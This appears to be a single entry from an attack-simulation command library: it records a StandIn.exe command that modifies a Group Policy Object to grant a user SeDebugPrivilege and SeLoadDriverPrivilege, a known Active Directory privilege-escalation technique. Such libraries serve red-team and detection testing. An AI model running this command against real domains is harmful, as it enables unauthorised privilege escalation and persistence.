---
id: 44340f37-51cb-4249-948a-b66e7835e42c
name: Set custom user rights with StandIn.exe
type: command
executor: bash
data: StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
output: null
created_at: '2023-04-06T03:56:03.746749+00:00'
updated_at: '2023-04-10T20:25:53.888835+00:00'
---

# Set custom user rights with StandIn.exe

```bash
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
```


